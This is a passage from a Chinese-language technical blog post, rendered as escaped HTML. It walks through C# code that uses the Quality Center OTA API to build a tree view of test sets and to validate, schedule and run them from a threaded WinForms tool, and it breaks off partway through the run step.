&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;CreateTreeView&lt;/span&gt;()&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                TreeNode mainNode = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TreeNode();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                mainNode.Name = &lt;span class=&quot;hljs-string&quot;&gt;&quot;Root&quot;&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;                mainNode.Text = &lt;span class=&quot;hljs-string&quot;&gt;&quot;Root&quot;&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                Add_TreeRoot(mainNode);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                SysTreeNode test_folder;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;                TestSetFactory globalTestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;                List l_List;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;                TreeNode r_node = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TreeNode();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; nodeCount;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;                nodeCount = qcProjectTree.GetNodeCount(&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;                TreeNode[] r_nodeArray = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TreeNode[&lt;span class=&quot;hljs-number&quot;&gt;10000&lt;/span&gt;];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;19&lt;/span&gt;                r_nodeArray = qcProjectTree.Nodes.Find(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Root&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;20&lt;/span&gt;                r_node = r_nodeArray[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;21&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;22&lt;/span&gt;                TestSetTreeManager tm;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;23&lt;/span&gt;                tm = (TDAPIOLELib.TestSetTreeManager)tdc.TestSetTreeManager;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;24&lt;/span&gt;                test_folder = (TDAPIOLELib.SysTreeNode)tm.Root;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;25&lt;/span&gt;                globalTestSetFactory = (TDAPIOLELib.TestSetFactory)tdc.TestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;26&lt;/span&gt;                l_List = globalTestSetFactory.NewList(&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;27&lt;/span&gt;                recursiveTreeBuilder(test_folder, r_node);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;28&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;29&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;30&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;31&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;32&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;33&lt;/span&gt;        }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;34&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;35&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;36&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;recursiveTreeBuilder&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;TDAPIOLELib.SysTreeNode folder, TreeNode parent&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;37&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;38&lt;/span&gt;            TDAPIOLELib.List folders, tests;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;39&lt;/span&gt;            TDAPIOLELib.TestSetFactory objTestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;40&lt;/span&gt;            TDAPIOLELib.TestSetFolder objTSFolder;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;41&lt;/span&gt;            TreeNode n;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;42&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;43&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;44&lt;/span&gt;                folders = folder.NewList();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;45&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;foreach&lt;/span&gt; (TDAPIOLELib.SysTreeNode f &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; folders)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;46&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;47&lt;/span&gt;                    TreeNode nodeChild = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TreeNode();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;48&lt;/span&gt;                    nodeChild.Name = f.Name;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;49&lt;/span&gt;                    nodeChild.Text = f.Name;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;50&lt;/span&gt;                    nodeChild.ImageIndex = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;51&lt;/span&gt;                    Add_TreeNode(parent, nodeChild);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;52&lt;/span&gt;                    n = parent.Nodes[nodeChild.Name];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;53&lt;/span&gt;                    recursiveTreeBuilder(f, n);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;54&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;55&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;56&lt;/span&gt;                objTSFolder = (TDAPIOLELib.TestSetFolder)folder;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;57&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (objTSFolder.NodeID != &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;58&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;59&lt;/span&gt;                    objTestSetFactory = (TDAPIOLELib.TestSetFactory)objTSFolder.TestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;60&lt;/span&gt;                    tests = objTestSetFactory.NewList(&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;61&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;foreach&lt;/span&gt; (TDAPIOLELib.TestSet testSet &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; tests)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;62&lt;/span&gt;                    {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;63&lt;/span&gt;                        TreeNode nodeChild1 = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; TreeNode();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;64&lt;/span&gt;                        nodeChild1.Name = testSet.ID.ToString();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;65&lt;/span&gt;                        nodeChild1.Text = testSet.Name;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;66&lt;/span&gt;                        nodeChild1.ImageIndex = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;67&lt;/span&gt;                        Add_TreeNode(parent, nodeChild1);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;68&lt;/span&gt;                        n = parent.Nodes[nodeChild1.Name];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;69&lt;/span&gt;                        n.Tag = objTSFolder.Path + &lt;span class=&quot;hljs-string&quot;&gt;@&quot;\&quot;&lt;/span&gt; + testSet.Name;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;70&lt;/span&gt;                    }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;71&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;72&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;73&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;74&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;75&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;76&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;77&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;78&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;79&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下代码用委托的方式生成节点，保证在业务树生成过程中可随时点击并保证界面不出现假死（跟业务树生成无直接关系，可忽略）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cs&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;delegate&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Add_Node&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;TreeNode parent, TreeNode node&lt;/span&gt;)&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Add_TreeNode&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;TreeNode parent, TreeNode node&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.InvokeRequired)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.BeginInvoke(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Add_Node(Add_TreeNode), parent, node);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;                parent.Nodes.Add(node);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;            Thread.Sleep(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;生成业务树后，由用户通过业务树选择需要运行的节点，形成待测试列表，就是后续代码中的TestSetList，这部分代码跟QC无关，也不列举了。&lt;/p&gt;
&lt;h3 id=&quot;h-2&quot;&gt;&lt;span&gt;重点之二：测试执行&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;先看一个总体调用RunTestSetPlan，当然也是需要新开线程调用的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs coffeescript&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;1&lt;/span&gt;        Thread td_runTestSetPlan = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Thread(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ThreadStart(&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.RunTestSetPlan));&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;2&lt;/span&gt;        td_runTestSetPlan.Start();&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调用步骤是先检验validate，然后运行run，最后收集结果monitor：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;RunTestSetPlan&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (tdc.ProjectConnected == &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (TestSetNameList.Items.Count != &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;                    {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                        &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; TestSetList.Items.Count; i++)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;                        {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (validateTestSetID(TestSetList.Items[i].ToString(), i) == &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;                            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;                                &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (runTestSet(TestSetList.Items[i].ToString(), i) == &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;                                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;                                    &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (monitorTestSet(TestSetList.Items[i].ToString()) == &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;                                    {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;17&lt;/span&gt;                                        QCexecutionStatus.RefreshExecStatusInfo(&lt;span class=&quot;hljs-string&quot;&gt;&quot;all&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);                      &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;18&lt;/span&gt;                                    }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;19&lt;/span&gt;                                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;20&lt;/span&gt;                            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;21&lt;/span&gt;                        }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;22&lt;/span&gt;                    }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;23&lt;/span&gt;                    &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;24&lt;/span&gt;                        MessageBox.Show(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Empty Test Set List.&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Warning&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;25&lt;/span&gt;                }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;26&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;27&lt;/span&gt;                    MessageBox.Show(&lt;span class=&quot;hljs-string&quot;&gt;&quot;Connection Error, please login again.&quot;&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;&quot;Warning&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;28&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;29&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;catch&lt;/span&gt; (Exception ex)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;30&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;31&lt;/span&gt;                Console.WriteLine(ex.ToString());&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;32&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;33&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;validate通过QCfilter，使用testSetID去做筛选，取得我们需要的测试集，然后根据判断测试集是否为空来确定测试集是否有效，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;validateTestSetID&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; testSetID, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;            TDAPIOLELib.TestSetFactory QCtestSetFactory = (TDAPIOLELib.TestSetFactory)tdc.TestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            TDAPIOLELib.TDFilter QCfilter = (TDAPIOLELib.TDFilter)QCtestSetFactory.Filter;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;            QCfilter[&lt;span class=&quot;hljs-string&quot;&gt;&quot;CY_CYCLE_ID&quot;&lt;/span&gt;] = testSetID;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;            List QClist = QCfilter.NewList();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (QClist.Count != &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;            }&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;            }             &lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;        }&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;runTest与之前类似，获取首只测试集对象后，通过QCTSTestFactory将测试集下的所有用例形成QClistForTSTest列表，并用QCscheduler执行，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs cpp&quot;&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 1&lt;/span&gt;        &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;runTestSet&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(&lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; testSetID, &lt;span class=&quot;hljs-keyword&quot;&gt;int&lt;/span&gt; i)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 2&lt;/span&gt;        &lt;/span&gt;{&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 3&lt;/span&gt;            &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 4&lt;/span&gt;            {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 5&lt;/span&gt;                TDAPIOLELib.TestSetFactory QCtestSetFactory = (TDAPIOLELib.TestSetFactory)tdc.TestSetFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 6&lt;/span&gt;                TDAPIOLELib.TDFilter QCfilter = (TDAPIOLELib.TDFilter)QCtestSetFactory.Filter;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 7&lt;/span&gt;                QCfilter[&lt;span class=&quot;hljs-string&quot;&gt;&quot;CY_CYCLE_ID&quot;&lt;/span&gt;] = testSetID;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 8&lt;/span&gt;                List QClist = QCfilter.NewList();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt; 9&lt;/span&gt;                TDAPIOLELib.TestSet QCtestSet = (TDAPIOLELib.TestSet)QClist[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;];&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;10&lt;/span&gt;                TDAPIOLELib.TestSetFolder QCtestSetFolder = (TDAPIOLELib.TestSetFolder)QCtestSet.TestSetFolder;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;11&lt;/span&gt;                TDAPIOLELib.TSTestFactory QCTSTestFactory = (TDAPIOLELib.TSTestFactory)QCtestSet.TSTestFactory;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;12&lt;/span&gt;                QClistForTSTest = QCTSTestFactory.NewList(&lt;span class=&quot;hljs-string&quot;&gt;&quot;&quot;&lt;/span&gt;);&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;13&lt;/span&gt;                &lt;span class=&quot;hljs-keyword&quot;&gt;try&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;14&lt;/span&gt;                {&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;15&lt;/span&gt;                    &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; applicationCreationTime = File.GetCreationTime(@&lt;span class=&quot;hljs-string&quot;&gt;&quot;The path of Your application&quot;&lt;/span&gt;).ToString();&lt;br/&gt;&lt;span class=&quot;linenum hljs-number&quot;&gt;16&lt;/span&gt;                    &lt;span class=&quot;hljs-built_in&quot;&gt;string&lt;/span&gt; machineName = System.Net.Dns.GetHostEntry(&lt;span class=&quot;hljs-string&quot;&gt;&quot;IP address of test 